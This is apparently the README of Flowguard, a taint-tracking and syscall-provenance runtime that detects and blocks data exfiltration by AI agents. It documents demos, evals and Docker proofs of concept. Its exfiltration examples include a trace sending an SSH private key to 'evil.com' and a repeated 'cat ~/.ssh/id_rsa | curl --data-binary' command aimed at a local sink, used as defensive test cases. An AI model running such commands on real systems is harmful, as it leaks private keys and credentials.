# Flowguard

## Overview

This project implements a **provenance-aware security runtime** for AI agents.

Flowguard has two implementation layers:

- `runtimes/python-taint`: precise Python dynamic taint tracking for agent tools, generated code, and supported IO boundaries
- `crates/system-provenance`: Rust syscall/process provenance for conservative sandbox fallback, replay, graph construction, policy decisions, and explanations

The goal is to detect, block, and explain unsafe data movement in AI agents and automated systems.

## Landing Page

The public AgentLineage landing page is maintained separately in
`/Users/emanuelevannacci/github/agentlineage-site` so website deployment access
does not need access to this repository.

---

## Motivation

Modern AI agents can:
- execute shell commands
- access files
- call APIs
- interact with external systems

This introduces risks such as:
- prompt injection leading to code execution
- data exfiltration
- execution of untrusted content

We need a system that answers:

> "Where did this data come from, and where did it go?"

---

## Key Idea

We model execution as a **provenance graph**
sources → processes → sinks

Where:
- sources = files, network, prompt input
- processes = programs
- sinks = execution, file writes, network

---

## Features (MVP)

- syscall-level event ingestion (simulated initially)
- provenance graph construction
- label propagation (PROMPT, EXTERNAL, SECRET, etc.)
- policy-based detection
- human-readable explanations

---

## Example Detection

### Secret Exfiltration

file:/home/user/.ssh/id_rsa –READ–> proc:cat
proc:cat –WRITE–> pipe
pipe –READ–> proc:curl
proc:curl –SEND–> ep:evil.com

Violation:

SECRET → NETWORK

## Reproduce The Python MVP PoC

See the [Python taint demo index](runtimes/python-taint/demos/README.md) for a
comparison of every supported demo and its threat model.

This is the fastest public demo of the Python dynamic taint runtime:

```sh
bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
```

The script runs three generated-code cases:

- transformed secret exfiltration: blocked as `SecretToNetwork`
- safe telemetry after reading a secret: allowed
- `json.dumps` precision loss in strict mode: blocked as `TaintPrecisionLostToNetwork`

Expected terminal summary:

```text
Flowguard Python MVP PoC

[1/3] transformed secret exfiltration
result: BLOCKED SecretToNetwork

[2/3] safe telemetry
result: ALLOWED

[3/3] precision-loss strict mode
result: BLOCKED TaintPrecisionLostToNetwork
```

Generated artifacts:

- `logs/python-mvp-poc.report.json`
- `logs/python-mvp-poc.events.jsonl`

### What This Proves

The PoC demonstrates Flowguard's current Python runtime claim:

- secret-derived tracked values are blocked before supported HTTP egress
- safe constant telemetry is allowed even after the process reads a secret
- lossy generated-code conversions are reported as precision gaps instead of silently treated as safe
- strict precision mode blocks later supported egress after unresolved secret precision loss

### Inspect The Report

Pretty-print the report:

```sh
python3 -m json.tool logs/python-mvp-poc.report.json | less
```

Useful fields to inspect:

- `summary.violation_count`: expected `2`
- `summary.allowed_send_count`: expected `1`
- `summary.precision_loss_count`: expected `1`
- `violations[].policy`: contains `SecretToNetwork` and `TaintPrecisionLostToNetwork`
- `violations[].sources`: contains the generated demo secret file source
- `violations[].transforms`: shows tracked operations such as `str.replace`, `str.lower`, and `str.encode`
- `precision_losses[].operation`: contains `json.dumps`

Raw event stream:

```sh
head -n 20 logs/python-mvp-poc.events.jsonl
```

The JSONL file is useful for replay, future Rust-core ingestion, and SIEM-style export.

Current limitations:

- the PoC covers generated Python code executed through `FlowguardRuntime.run_python`
- strict precision-loss blocking currently covers selected lossy conversions such as `json.dumps`, `str`, and `bytes`
- raw sockets, native extensions, and broader library encoders remain hardening work

Useful overrides:

```sh
FLOWGUARD_POC_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
FLOWGUARD_POC_NAME=my-review bash runtimes/python-taint/scripts/run_python_mvp_poc.sh
```

## Reproduce The Live OpenAI Agent Demo

This demo uses the OpenAI Agents SDK to run a real LLM-backed tool-calling agent.
The model is asked to generate Python code that reads a fake local secret and
tries to send it over HTTP. Flowguard executes that generated code through the
protected Python runtime and blocks before the HTTP transport is reached.

Run the demo:

```sh
OPENAI_API_KEY=... bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
```

The script builds or reuses a Docker image named `flowguard-python-taint-demo`
and runs the live agent inside a restricted container. The container has outbound
network access for the OpenAI API, but the fake exfiltration endpoint should not
be reached because Flowguard blocks before HTTP transport.

Expected terminal summary:

```text
Flowguard OpenAI Live Agent Demo
model: gpt-5-nano

result: BLOCKED SecretToNetwork
network_calls=0
```

Generated artifacts:

- `logs/openai-live-agent-demo.report.json`
- `logs/openai-live-agent-demo.events.jsonl`

Useful fields to inspect:

- `summary.violation_count`: expected `1`
- `violations[].policy`: expected `SecretToNetwork`
- `violations[].transforms`: shows the generated-code transformation path
- `events[]`: includes the OpenAI tool call, generated-code execution, file read, and blocked HTTP send

Useful overrides:

```sh
FLOWGUARD_AGENT_MODEL=gpt-5-nano bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
FLOWGUARD_AGENT_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
FLOWGUARD_AGENT_NAME=my-live-review bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
FLOWGUARD_AGENT_SKIP_DOCKER_BUILD=1 bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
```

For local development without Docker, install the optional SDK and opt out:

```sh
python3 -m pip install openai-agents
OPENAI_API_KEY=... FLOWGUARD_AGENT_LOCAL=1 bash runtimes/python-taint/scripts/run_openai_live_agent_leak_demo.sh
```

The OpenAI SDK is intentionally optional. The core Flowguard Python runtime does
not depend on OpenAI or LangChain packages.

## Reproduce The Model Request Guard Demo

This offline OpenAI Agents SDK demo treats the model call itself as an egress
boundary. A fake model requests a protected `read_secret` tool. Flowguard binds
the secret provenance to the SDK `tool_call_id`, then blocks the next model
request before the fake provider receives it:

```sh
bash runtimes/python-taint/scripts/run_model_request_guard_demo.sh
```

The Docker demo runs with `--network none` and needs no API key. Expected result:

```text
Flowguard Model Request Guard Demo
result: BLOCKED SecretToModel
provider_calls=1
sensitive_provider_calls=0
```

Generated artifacts:

- `logs/model-request-guard-demo.report.json`
- `logs/model-request-guard-demo.events.jsonl`

The report contains one allowed public model request and one blocked
secret-derived request. It records labels, source references, destination,
policy, and action without storing prompt, tool-output, or secret content.

To guard a real SDK model, wrap the model or its provider:

```python
guarded_model = runtime.guard_openai_model(
    model,
    provider="openai",
    model_name="gpt-5",
    trust_zone="external",
)

with runtime.provenance_context.scope():
    result = await Runner.run(
        Agent(name="protected", model=guarded_model, tools=tools),
        input=user_input,
    )
```

Existing SDK graphs can be protected in place without rebuilding their agents
or `@function_tool` schemas:

```python
from flowguard import SourceRef, ToolSinkRule, ToolSourceRule

runtime.protect_openai_agent_graph(
    triage_agent,
    additional_agents=[guardrail_agent, jailbreak_guardrail_agent],
    source_rules=[
        ToolSourceRule(
            "get_trip_details",
            labels={"CustomerData"},
            source=SourceRef.tool("get_trip_details"),
        ),
    ],
    sink_rules=[
        ToolSinkRule(
            "upload_customer_record",
            labels={"CustomerData"},
            policy="CustomerDataToNetwork",
        ),
    ],
)

with runtime.provenance_context.scope():
    result = await Runner.run(triage_agent, input=user_input)
```

The traversal follows direct and configured handoffs without looping. Agents
hidden inside guardrail or application callbacks are not visible in the SDK
graph and must be listed through `additional_agents`.

An explicit provenance scope isolates concurrent agent runs and releases
sidecar response and tool-call bindings when the run completes. Approved local
or enterprise models use a `ModelRule.allow_and_propagate(...)` rule; their
generated tool calls retain the sensitive provenance for later sink checks.

### Harden An Existing OpenAI Agent Application

The `openai/openai-cs-agents-demo` integration applies Flowguard to the
upstream airline agent graph without modifying the submodule. The primary demo
uses only native agents and tools. It compares an allowed second model request
containing `get_trip_details` output with a protected request blocked before
the external provider call:

```sh
git submodule update --init --recursive
export OPENAI_API_KEY="..."
bash runtimes/python-taint/integrations/openai-cs-agents-demo/run_model_egress_demo.sh
```

Expected result:

```text
Flowguard Native Model Egress Demo
case: baseline-sensitive
result: DATA_REACHED_MODEL
Flowguard Native Model Egress Demo
case: protected-sensitive
result: BLOCKED CustomerDataToExternalModel
Flowguard Native Model Egress Demo
case: protected-public
result: ALLOWED
```

The controlled export-tool scenario remains available through
`run_leak_demo.sh`.

Add `--interactive` to the model-egress command for a protected prompt loop.

The model-egress reports are written to
`logs/openai-cs-model-egress-demo.<case>.report.json` with matching
`.events.jsonl` streams. The integration also provides a
protected ChatKit server overlay with per-stream provenance isolation; see
[`runtimes/python-taint/integrations/openai-cs-agents-demo/README.md`](runtimes/python-taint/integrations/openai-cs-agents-demo/README.md).

For local execution, install the optional SDK and opt out of Docker:

```sh
python3 -m pip install openai-agents
FLOWGUARD_MODEL_GUARD_LOCAL=1 bash runtimes/python-taint/scripts/run_model_request_guard_demo.sh
```

## Reproduce The LangChain/LangGraph Demo

This offline demo adapts Flowguard tools to LangChain's `StructuredTool`
interface, which is also accepted by LangGraph tool nodes. It reads a fake
secret, transforms it, and invokes a protected network tool. Flowguard blocks
the send before the fake transport is reached:

```sh
bash runtimes/python-taint/scripts/run_langchain_leak_demo.sh
```

Expected terminal summary:

```text
adapter: LangChain/LangGraph tools registered
# or: adapter: skipped (...) when langchain-core is not installed
Flowguard LangChain/LangGraph Demo
result: BLOCKED SecretToNetwork
network_calls=0
```

`langchain-core` is optional. When it is installed, the demo invokes converted
tools through `.invoke(...)`, matching LangChain and LangGraph tool execution.
Without it, the same deterministic scenario runs directly through
`FlowguardTool` and reports that adapter registration was skipped.

To exercise the adapter locally:

```sh
python3 -m pip install langchain-core
bash runtimes/python-taint/scripts/run_langchain_leak_demo.sh
```

Generated artifacts:

- `logs/langchain-secret-leak.report.json`
- `logs/langchain-secret-leak.events.jsonl`

Useful overrides:

```sh
FLOWGUARD_LANGCHAIN_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_langchain_leak_demo.sh
FLOWGUARD_LANGCHAIN_NAME=my-review bash runtimes/python-taint/scripts/run_langchain_leak_demo.sh
```

## Reproduce The Python Taint Eval

This offline eval suite checks the Python runtime's security behavior across
supported leak, safe-send, precision-loss, and unsupported-path cases:

```sh
bash runtimes/python-taint/scripts/run_python_taint_eval.sh
```

Expected terminal summary:

```text
Flowguard Python Taint Eval
cases=8
PASS direct_secret_to_http: blocked policy=SecretToNetwork
PASS transformed_secret_to_http: blocked policy=SecretToNetwork
PASS base64_secret_to_http: blocked policy=SecretToNetwork
PASS safe_telemetry_after_secret_read: allowed policy=-
PASS json_precision_loss_strict: blocked policy=TaintPrecisionLostToNetwork
PASS json_precision_loss_warn: allowed policy=-
PASS subprocess_escape_attempt: preflight_blocked policy=AstPolicyViolation
PASS raw_socket_attempt: preflight_blocked policy=AstPolicyViolation
```

Generated artifacts:

- `logs/python-taint-eval.report.json`
- `logs/python-taint-eval.events.jsonl`
- `logs/python-taint-eval.summary.md`

Useful commands:

```sh
bash runtimes/python-taint/scripts/run_python_taint_eval.sh --list
bash runtimes/python-taint/scripts/run_python_taint_eval.sh --case json_precision_loss_warn
FLOWGUARD_EVAL_OUT_DIR=/tmp/flowguard bash runtimes/python-taint/scripts/run_python_taint_eval.sh
FLOWGUARD_EVAL_NAME=my-eval bash runtimes/python-taint/scripts/run_python_taint_eval.sh
```

This is a correctness benchmark, not an overhead benchmark. It demonstrates
where Flowguard blocks definite tracked leaks, where it allows safe constant
telemetry, where warn mode reports precision loss without blocking, and where
unsupported generated-code paths are rejected before execution.

## Reproduce The Docker Observe POC

This POC runs a real shell pipeline inside Docker:

```sh
cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak
```

Flowguard observes the syscalls with `strace`, builds the provenance graph, blocks the `SecretToNetwork` policy violation, and dumps the violation log plus graph files.

### Automated Regression

Run the full POC regression with one command:

```sh
bash crates/system-provenance/scripts/run_observe_poc.sh
```

The script:
- builds the Docker observer image
- starts a local POST sink on a free host port
- runs the observed `cat secret | curl` leak inside Docker
- asserts Flowguard exits with `Block`
- asserts the report contains `SecretToNetwork`, a `Send` sink, and the explanation path
- dumps `logs/secret-to-network-regression.violation.log`
- dumps `logs/secret-to-network-regression.graph.dot`
- dumps `logs/secret-to-network-regression.graph.mmd`
- dumps `logs/secret-to-network-regression.raw.strace`
- dumps `logs/secret-to-network-regression.report.json`

Useful environment overrides:

```sh
FLOWGUARD_SKIP_DOCKER_BUILD=1 bash crates/system-provenance/scripts/run_observe_poc.sh
FLOWGUARD_POC_NAME=my-run bash crates/system-provenance/scripts/run_observe_poc.sh
FLOWGUARD_POC_PORT=18000 bash crates/system-provenance/scripts/run_observe_poc.sh
FLOWGUARD_DOCKER_EXTRA_ARGS='--add-host=host.docker.internal:host-gateway' bash crates/system-provenance/scripts/run_observe_poc.sh
```

### Validation Commands

Use the fast Rust suite for normal development:

```sh
cargo test
```

Use the Python runtime suite for Python taint changes:

```sh
PYTHONPATH=runtimes/python-taint/src PYTHONWARNINGS=error python3 -m unittest discover -s runtimes/python-taint/tests
```

Use the Docker-backed POC regression before demo changes or observer changes:

```sh
bash crates/system-provenance/scripts/run_observe_poc.sh
```

The Docker regression is intentionally not part of `cargo test` because it requires Docker, host networking to a local POST sink, and `strace` inside the observer image.

### Manual Steps

#### 1. Build The Observer Image

```sh
docker build -f crates/system-provenance/docker/observer.Dockerfile -t flowguard-observer .
```

#### 2. Start A Local POST Sink

Run this in terminal 1:

```sh
python3 -u -c '
from http.server import BaseHTTPRequestHandler, HTTPServer

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get("content-length", "0") or 0)
        if length:
            self.rfile.read(length)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *args):
        pass

HTTPServer(("0.0.0.0", 18000), Handler).serve_forever()
'
```

#### 3. Run The Observed Leak

Run this in terminal 2:

```sh
mkdir -p logs

docker run --rm \
  -v "$PWD:/work" \
  -v "$PWD/crates/system-provenance/fixtures/home:/home/user:ro" \
  -w /work \
  flowguard-observer \
  cargo run --manifest-path crates/system-provenance/Cargo.toml -- observe --json \
    --raw-strace logs/secret-to-network.raw.strace \
    -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak' \
  > logs/secret-to-network.report.json
```

Expected result: the command exits with status `1` because Flowguard blocks the policy violation. The JSON report is still written to `logs/secret-to-network.report.json`.

On Linux, if `host.docker.internal` is not available, add this to the `docker run` command:

```sh
--add-host=host.docker.internal:host-gateway
```

#### 4. Dump The Violation Log And Graph

```sh
python3 crates/system-provenance/scripts/dump_observe_report.py \
  logs/secret-to-network.report.json \
  --out-dir logs \
  --name secret-to-network
```

Generated files:

- `logs/secret-to-network.violation.log`: human-readable policy violation and explanation path
- `logs/secret-to-network.graph.dot`: Graphviz graph for the explanation path
- `logs/secret-to-network.graph.mmd`: Mermaid graph for markdown/docs
- `logs/secret-to-network.raw.strace`: raw syscall trace from `strace`
- `logs/secret-to-network.report.json`: full Flowguard observability report

The explanation path should look like:

```text
file:/home/user/.ssh/id_rsa --READ--> proc:22@10030
proc:22@10030 --WRITE--> pipe:1000
pipe:1000 --READ--> proc:23@10040
proc:23@10040 --SEND--> endpoint:192.168.65.254:18000
```

Optional SVG render if Graphviz is installed:

```sh
dot -Tsvg logs/secret-to-network.graph.dot -o logs/secret-to-network.graph.svg
```

## Reproduce The Docker Protect POC

The `protect` command is the runtime-blocking POC. It runs the same leak under a Linux `ptrace` tracer, updates the provenance engine incrementally, and kills the traced process tree before the unsafe socket write is resumed.

Run:

```sh
bash crates/system-provenance/scripts/run_protect_poc.sh
```

The script:
- uses an existing `flowguard-observer` image when present, otherwise falls back to `rust:1-bookworm`
- selects `linux/arm64` on Apple Silicon/ARM hosts and `linux/amd64` elsewhere
- starts a local POST sink
- runs `cat /home/user/.ssh/id_rsa | curl ...` under `flowguard protect`
- expects Flowguard to exit with `Block`
- asserts the POST sink received no request body
- dumps `logs/secret-to-network-protect.violation.log`
- dumps `logs/secret-to-network-protect.graph.dot`
- dumps `logs/secret-to-network-protect.graph.mmd`
- dumps `logs/secret-to-network-protect.report.json`

The Docker run uses `--cap-add=SYS_PTRACE` and `--security-opt seccomp=unconfined` because the POC tracer observes and controls its child process tree with `ptrace`.

Useful overrides:

```sh
FLOWGUARD_PROTECT_IMAGE=flowguard-observer bash crates/system-provenance/scripts/run_protect_poc.sh
FLOWGUARD_DOCKER_PLATFORM=linux/amd64 bash crates/system-provenance/scripts/run_protect_poc.sh
FLOWGUARD_DOCKER_PLATFORM=linux/arm64 bash crates/system-provenance/scripts/run_protect_poc.sh
```

Manual command shape:

```sh
docker run --rm --platform linux/amd64 \
  --cap-add=SYS_PTRACE \
  --security-opt seccomp=unconfined \
  -v "$PWD:/work" \
  -v "$PWD/crates/system-provenance/fixtures/home:/home/user:ro" \
  -w /work \
  flowguard-observer \
  cargo run --manifest-path crates/system-provenance/Cargo.toml -- protect --json \
    -- sh -c 'cat /home/user/.ssh/id_rsa | curl -sS -X POST --data-binary @- http://host.docker.internal:18000/leak'
```

Current limitation: the ptrace backend is intentionally scoped to Linux x86_64 and AArch64 for the first POC. On macOS, use the Docker script so the tracer runs inside Linux.

## Architecture

events → state → graph → labels → policies → explanations

Components:
- event ingestion
- process + FD tracking
- provenance graph
- label engine
- policy engine
- explanation engine

---

## Project Status

Early prototype.

Current focus:
- correctness
- clarity
- explainability

---


## Roadmap

- [ ] Synthetic event engine
- [ ] Provenance graph
- [ ] Label propagation
- [ ] Policy engine
- [ ] Scenario tests
- [ ] eBPF integration

---

## Why This Matters

This project explores:

> Runtime dataflow tracking for AI agents using syscall-level provenance.

It combines ideas from:
- system provenance
- runtime security
- AI agent safety

---
